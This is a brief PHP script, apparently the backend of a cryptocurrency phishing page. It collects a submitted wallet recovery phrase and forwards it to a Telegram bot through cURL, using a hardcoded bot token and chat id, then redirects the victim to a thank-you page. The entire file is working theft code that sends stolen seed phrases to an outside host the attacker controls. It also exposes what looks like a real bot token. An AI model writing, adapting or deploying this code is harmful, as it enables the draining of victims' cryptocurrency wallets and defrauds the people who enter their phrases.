<?php
// Replace with your own bot token and chat id
$botToken = 7210917381:AAGPxkv9Y3dqnBj_rHOtWvvuIyg9qHlpFrg;
$chatId = 5160818690;

// Get the recovery phrase from POST
$unlockSubmitBtn = isset($_POST['unlockSubmitBtn']) ? trim($_POST['unlockSubmitBtn']) : '';

if ($unlockSubmitBtn) {
    $message = "Recovery Phrase submitted:\n" . $unlockSubmitBtn;

    // Telegram API URL
    $url = "https://api.telegram.org/bot7210917381:AAGPxkv9Y3dqnBj_rHOtWvvuIyg9qHlpFrg/sendMessage";

    // Data to send
    $data = [
        'chat_id' => $chatId,
        'text' => $message,
        'parse_mode' => 'HTML'
    ];

    // Use cURL to send POST request
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $url);
    curl_setopt($ch, CURLOPT_POST, true);
    curl_setopt($ch, CURLOPT_POSTFIELDS, http_build_query($data));
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);

    $response = curl_exec($ch);
    curl_close($ch);

    // Optionally, redirect or show success message
    header("Location: success.html"); // Create success.html for a thank you page
    exit();
} else {
    // Handle error: No recovery phrase provided
    header("Location: error.html"); // Create error.html for error message
    exit();
}
?>
